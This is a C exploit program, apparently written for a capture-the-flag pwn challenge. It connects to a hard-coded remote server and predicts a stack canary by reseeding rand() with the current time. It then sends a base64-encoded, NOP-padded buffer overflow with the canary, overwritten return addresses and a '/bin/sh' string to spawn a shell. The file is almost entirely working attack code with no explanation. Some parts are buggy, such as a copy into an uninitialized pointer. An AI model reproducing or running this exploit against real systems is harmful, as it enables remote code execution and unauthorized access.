#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdint.h>
#include <sys/socket.h>
#include <netinet/in.h>


static char encoding_table[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
                                'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                                'w', 'x', 'y', 'z', '0', '1', '2', '3',
                                '4', '5', '6', '7', '8', '9', '+', '/'};
static char *decoding_table = NULL;
static int mod_table[] = {0, 2, 1};
int lenOfb64;




char *base64_encode(const unsigned char *data,
                    size_t input_length,
                    size_t *output_length) {

    *output_length = 4 * ((input_length + 2) / 3);

    char *encoded_data = (char *)malloc(*output_length);

    if (encoded_data == NULL) return NULL;

    for (int i = 0, j = 0; i < input_length;) {
        uint32_t octet_a = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_b = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_c = i < input_length ? (unsigned char)data[i++] : 0;

        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

        encoded_data[j++] = encoding_table[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 0 * 6) & 0x3F];
    }

    for (int i = 0; i < mod_table[input_length % 3]; i++)
        encoded_data[*output_length - 1 - i] = '=';

    return encoded_data;
}


int randCalc(int t, int m)
{
  srand(t);
  int num[32];
  for (int i=0;i<=7;i++)
  {
    num[i*4]=rand();
    //printf ("num[%d]:%x\n",i*4, num[i*4]);
  }
  int tot = (num[4]+num[20])+(num[8]-num[12])+(num[28])+(num[16]-num[24]);
  m -= tot;
  //printf ("%x\n",m);
  return m;
}

int toHex(char *source)
{
  int tot=0,n=1;
  //printf("toHex %s %d\n",source);
  //printf("toHex %s %d\n",source,len);
  for (int i=1;i>=0;i--)
  {
    //printf("tohex[%d] : %c\n",i,source[i]);
    if (source[i]>'9')
    {
      int tmp=source[i]-'a'+10;
      tot+=tmp*n;
    }
    else
    {
      int tmp=source[i]-'0';
      tot+=tmp*n;
    }
    n*=16;
  }
  return tot;
}

void p32(char *payload, char *hex, int pos)
{
  for (int i=0;i<4;i++)
  {
    char *tmp;
    strncpy(tmp, hex+8-(i+1)*2,2);
    unsigned int tmp2num=toHex(tmp);
    //printf("%s %d\n",tmp, tmp2num);
    payload[pos+i]=(char)tmp2num;
    //printf("%x %c\n", payload[pos+i], payload[pos+i]);
  }
}


int main(int argc, char *argv[]) {

  int flag=-2;

  char ch;
  char cookie[15];
  char payload[536],finalPayload[734];

  int clientSocket;
  char buffer[1024];
  struct sockaddr_in serverAddr;
  socklen_t addr_size;

  /*---- Create the socket. The three arguments are: ----*/
  /* 1) Internet domain 2) Stream socket 3) Default protocol (TCP in this case) */
  clientSocket = socket(PF_INET, SOCK_STREAM, 0);

  /*---- Configure settings of the server address struct ----*/
  /* Address family = Internet */
  serverAddr.sin_family = AF_INET;
  /* Set port number, using htons function to use proper byte order */
  serverAddr.sin_port = htons(9002);
  /* Set IP address to localhost */
  serverAddr.sin_addr.s_addr = inet_addr("143.248.249.64");
  /* Set all bits of the padding field to 0 */
  memset(serverAddr.sin_zero, '\0', sizeof serverAddr.sin_zero);

  /*---- Connect the socket to the server using the address struct ----*/
  addr_size = sizeof serverAddr;

  connect(clientSocket, (struct sockaddr *) &serverAddr, addr_size);
  time_t t=time(0)-10.0;

	char captcha[15];
   while (read(clientSocket,&ch,1) == 1)
   {
     write(1,&ch,1);
     if (ch==':' || flag!=-2)
     {
         if (flag>=0)
         {
             captcha[flag]=ch;
         }
         flag++;
         if (ch==0xa)
           break;
     }
   }


   int m=atoi(captcha);
   int len=sprintf(cookie,"%x",randCalc(t,m));
   printf("The cookie : %s\n",cookie);


   memset(payload, 0x90, 536);
   p32(payload,cookie,512);
   p32(payload,"08049174",528);
   p32(payload,"0804b3b6",532);

   printf("lenOfb64 : %p\n", &lenOfb64);
   char *encdpd=base64_encode(payload,536,&lenOfb64);
   //printf("Encode payload with length %d: %s\n", lenOfb64, encdpd );
   memset(finalPayload,0x90,734);
   strcpy(finalPayload,encdpd);
   strcpy(finalPayload+726,"/bin/sh");
   /*printf("finalPayload : ");
   for (int i=0;i<734;i++)
     printf("%c",finalPayload[i]);*/

   sprintf(cookie,"%d",m);
   printf("WTF!!!:%d %d\n",strlen(cookie),strlen(captcha));
   for (int i=0;i<strlen(captcha);i++)
     write(clientSocket,&cookie[i],1);
   write(clientSocket,"0xa",1);


   while (read(clientSocket,&ch,1) == 1)
   {
     write(1,&ch,1);
     if (ch=='!')
     {
       for (int i=0;i<734;i++)
         write(clientSocket,&finalPayload[i],1);
       write(clientSocket,"\nls",1);
       //break;
     }
   }

  // printf("%s\n",buffer);
   return 0;
}
